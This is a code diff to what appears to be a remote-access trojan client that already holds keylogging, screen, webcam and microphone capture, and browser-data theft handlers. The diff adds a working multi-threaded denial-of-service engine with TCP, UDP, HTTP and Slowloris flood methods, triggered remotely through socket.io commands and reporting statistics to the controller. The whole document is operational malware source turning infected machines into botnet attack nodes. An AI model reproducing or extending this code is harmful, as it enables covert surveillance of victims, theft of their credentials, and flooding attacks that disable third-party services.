@@ -1456,6 +1456,8 @@ def setup_handlers(sio):
     mon = SysMon(sio)
     term = Term(sio)
     keylog = Keylog(sio)
+    global ddos
+    ddos = DdosEngine(sio)
     state.scap = sc; state.wcap = wc; state.mic = mic; state.keylog = keylog
 
     @sio.on("connect")
@@ -1674,9 +1676,168 @@ def setup_handlers(sio):
         result = _browser_steal()
         sio.emit("browser_steal_result", result)
 
+    @sio.on("ddos_start")
+    def _ddos_start(d=None):
+        d = d or {}
+        target = d.get("target", "")
+        port = d.get("port", 80)
+        threads = d.get("threads", 50)
+        pkt_size = d.get("packet_size", 1024)
+        method = d.get("method", "tcp")
+        if not target:
+            sio.emit("ddos_status", {"active": False, "error": "No target specified"})
+            return
+        log.info(f"DDoS start: {method} -> {target}:{port} ({threads} threads)")
+        ddos.start(target, port=port, threads=threads, packet_size=pkt_size, method=method)
+
+    @sio.on("ddos_stop")
+    def _ddos_stop(d=None):
+        ddos.stop()
+
     @sio.on("kill_switch")
     def _ks(d=None):
-        log.warning("KILL SWITCH"); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); sio.disconnect(); os._exit(0)
+        log.warning("KILL SWITCH"); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); ddos.stop(); sio.disconnect(); os._exit(0)
+
+# ── DDoS Engine ──────────────────────────────────────────────────────
+class DdosEngine:
+    """Multi-threaded DDoS attack engine supporting TCP, UDP, HTTP, Slowloris."""
+    def __init__(self, sio):
+        self.r = False; self.sio = sio
+        self.threads = []; self.stats = {"packets": 0, "data_bytes": 0, "start_time": 0}
+        self._lock = threading.Lock(); self._target = ""; self._port = 80
+
+    def start(self, target, port=80, threads=50, packet_size=1024, method="tcp"):
+        if self.r: self.stop()
+        threads = max(1, min(500, threads))
+        packet_size = max(64, min(65500, packet_size))
+        port = max(1, min(65535, port))
+        self.r = True
+        self._target = target; self._port = port
+        self.stats = {"packets": 0, "data_bytes": 0, "start_time": time.time()}
+        log.info(f"DDoS starting: {method} flood -> {target}:{port} ({threads} threads)")
+
+        # Resolve hostname once
+        try:
+            self._target_ip = socket.gethostbyname(target)
+        except:
+            self._target_ip = target
+
+        for i in range(threads):
+            t = threading.Thread(target=self._worker, args=(method, packet_size, i), daemon=True)
+            t.start()
+            self.threads.append(t)
+
+        # Stats reporter
+        threading.Thread(target=self._stats_reporter, daemon=True).start()
+
+        if self.sio and self.sio.connected:
+            self.sio.emit("ddos_status", {"active": True, "target": f"{target}:{port}", "method": method, "threads": threads})
+
+    def stop(self):
+        self.r = False
+        for t in self.threads:
+            if t.is_alive():
+                t.join(timeout=1)
+        self.threads = []
+        if self.sio and self.sio.connected:
+            self.sio.emit("ddos_status", {"active": False})
+        log.info("DDoS stopped")
+
+    def _worker(self, method, pkt_size, tid):
+        """Worker thread that sends packets continuously."""
+        payload = os.urandom(pkt_size) if method != "http" else None
+
+        if method == "tcp":
+            while self.r:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    s.connect_ex((self._target_ip, self._port))
+                    s.send(payload[:min(pkt_size, 65536)])
+                    s.close()
+                    with self._lock:
+                        self.stats["packets"] += 1
+                        self.stats["data_bytes"] += pkt_size
+                except:
+                    with self._lock:
+                        self.stats["packets"] += 1
+
+        elif method == "udp":
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                while self.r:
+                    try:
+                        s.sendto(payload[:min(pkt_size, 65507)], (self._target_ip, self._port))
+                        with self._lock:
+                            self.stats["packets"] += 1
+                            self.stats["data_bytes"] += pkt_size
+                    except:
+                        with self._lock:
+                            self.stats["packets"] += 1
+                s.close()
+            except:
+                pass
+
+        elif method == "http":
+            url = f"{self._target}:{self._port}" if self._port != 80 and self._port != 443 else self._target
+            proto = "https" if self._port == 443 else "http"
+            full_url = f"{proto}://{url}/"
+            while self.r:
+                try:
+                    r = urllib.request.urlopen(full_url, timeout=3)
+                    data = r.read()
+                    with self._lock:
+                        self.stats["packets"] += 1
+                        self.stats["data_bytes"] += len(data)
+                except:
+                    with self._lock:
+                        self.stats["packets"] += 1
+
+        elif method == "slowloris":
+            sockets_held = []
+            try:
+                while self.r:
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(3)
+                        s.connect((self._target_ip, self._port))
+                        s.send(f"GET / HTTP/1.1\r\nHost: {self._target}\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n".encode())
+                        sockets_held.append(s)
+                        with self._lock:
+                            self.stats["packets"] += 1
+                        # Keep connection alive with partial headers
+                        if len(sockets_held) > 200:
+                            old = sockets_held.pop(0)
+                            try: old.close()
+                            except: pass
+                        for _ in range(50):
+                            if not self.r: return
+                            time.sleep(0.1)
+                    except:
+                        pass
+            finally:
+                for s in sockets_held:
+                    try: s.close()
+                    except: pass
+
+    def _stats_reporter(self):
+        """Periodically send stats to the server."""
+        while self.r:
+            time.sleep(2)
+            if not self.r: break
+            with self._lock:
+                elapsed = max(0.001, time.time() - self.stats["start_time"])
+                pps = int(self.stats["packets"] / elapsed)
+                data_mb = self.stats["data_bytes"] / (1024 * 1024)
+                if self.sio and self.sio.connected:
+                    self.sio.emit("ddos_result", {
+                        "stats": {
+                            "packets": self.stats["packets"],
+                            "pps": pps,
+                            "data_mb": round(data_mb, 2),
+                            "elapsed": int(elapsed)
+                        }
+                    })
 
 # ── Main ─────────────────────────────────────────────────────────────
 def main():
